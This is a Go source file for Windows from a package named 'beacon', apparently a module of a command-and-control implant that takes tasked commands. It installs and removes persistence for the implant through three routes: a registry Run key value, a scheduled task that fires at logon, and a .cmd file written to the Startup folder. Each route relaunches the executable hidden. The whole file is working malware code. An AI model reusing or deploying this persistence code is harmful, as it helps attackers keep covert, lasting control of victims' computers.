//go:build windows

package beacon

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"golang.org/x/sys/windows/registry"

	"darkarts/pkg/tasking"
)

const persistRunKey = `Software\Microsoft\Windows\CurrentVersion\Run`

// defaultPersistCmd wraps the beacon so it relaunches hidden at logon.
func defaultPersistCmd() (string, error) {
	exe, err := os.Executable()
	if err != nil {
		return "", err
	}
	return `cmd /c start "" /b "` + exe + `"`, nil
}

func (e *Executor) runPersist(payload []byte, res *tasking.Result) {
	var p struct {
		Method string `json:"method"`
		Name   string `json:"name"`
		Cmd    string `json:"cmd"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	cmd := p.Cmd
	if cmd == "" {
		var err error
		cmd, err = defaultPersistCmd()
		if err != nil {
			res.Error = "persist: cannot determine executable path: " + err.Error()
			return
		}
	}
	if p.Name == "" {
		res.Error = "persist: name is required"
		return
	}
	switch p.Method {
	case "reg":
		res.Output = []byte(persistReg(p.Name, cmd))
	case "schtasks":
		res.Output = []byte(persistSchtasks(p.Name, cmd))
	case "startup":
		res.Output = []byte(persistStartup(p.Name, cmd))
	default:
		res.Error = "beacon: persist method must be reg, schtasks or startup"
	}
}

func (e *Executor) runUnpersist(payload []byte, res *tasking.Result) {
	var p struct {
		Method string `json:"method"`
		Name   string `json:"name"`
	}
	if err := json.Unmarshal(payload, &p); err != nil {
		res.Error = err.Error()
		return
	}
	if p.Name == "" {
		res.Error = "unpersist: name is required"
		return
	}
	switch p.Method {
	case "reg":
		res.Output = []byte(unpersistReg(p.Name))
	case "schtasks":
		res.Output = []byte(unpersistSchtasks(p.Name))
	case "startup":
		res.Output = []byte(unpersistStartup(p.Name))
	default:
		res.Error = "beacon: unpersist method must be reg, schtasks or startup"
	}
}

func persistReg(name, cmd string) string {
	k, err := registry.OpenKey(registry.CURRENT_USER, persistRunKey, registry.SET_VALUE)
	if err != nil {
		return "persist reg: open failed: " + err.Error()
	}
	defer k.Close()
	if err := k.SetStringValue(name, cmd); err != nil {
		return "persist reg: set failed: " + err.Error()
	}
	return fmt.Sprintf("persisted HKCU\\%s => %s = %s", persistRunKey, name, cmd)
}

func unpersistReg(name string) string {
	k, err := registry.OpenKey(registry.CURRENT_USER, persistRunKey, registry.SET_VALUE)
	if err != nil {
		return "unpersist reg: open failed: " + err.Error()
	}
	defer k.Close()
	if err := k.DeleteValue(name); err != nil {
		return "unpersist reg: delete failed: " + err.Error()
	}
	return "removed HKCU\\" + persistRunKey + " value " + name
}

func persistSchtasks(name, cmd string) string {
	out, err := exec.Command("schtasks", "/Create", "/TN", name, "/TR", cmd, "/SC", "ONLOGON", "/RL", "LIMITED", "/F").CombinedOutput()
	if err != nil {
		return "persist schtasks: " + err.Error() + ": " + strings.TrimSpace(string(out))
	}
	return "created task " + name + " (" + cmd + ")"
}

func unpersistSchtasks(name string) string {
	out, err := exec.Command("schtasks", "/Delete", "/TN", name, "/F").CombinedOutput()
	if err != nil {
		return "unpersist schtasks: " + err.Error() + ": " + strings.TrimSpace(string(out))
	}
	return "deleted task " + name
}

func startupDir() (string, error) {
	appdata, err := os.UserConfigDir()
	if err != nil {
		return "", err
	}
	return filepath.Join(appdata, "Microsoft", "Windows", "Start Menu", "Programs", "Startup"), nil
}

func persistStartup(name, cmd string) string {
	dir, err := startupDir()
	if err != nil {
		return "persist startup: " + err.Error()
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "persist startup: " + err.Error()
	}
	path := filepath.Join(dir, name+".cmd")
	content := "@echo off\r\n" + cmd + "\r\n"
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		return "persist startup: " + err.Error()
	}
	return "wrote " + path + " (" + cmd + ")"
}

func unpersistStartup(name string) string {
	dir, err := startupDir()
	if err != nil {
		return "unpersist startup: " + err.Error()
	}
	path := filepath.Join(dir, name+".cmd")
	if err := os.Remove(path); err != nil {
		if os.IsNotExist(err) {
			return "unpersist startup: nothing to remove at " + path
		}
		return "unpersist startup: " + err.Error()
	}
	return "removed " + path
}
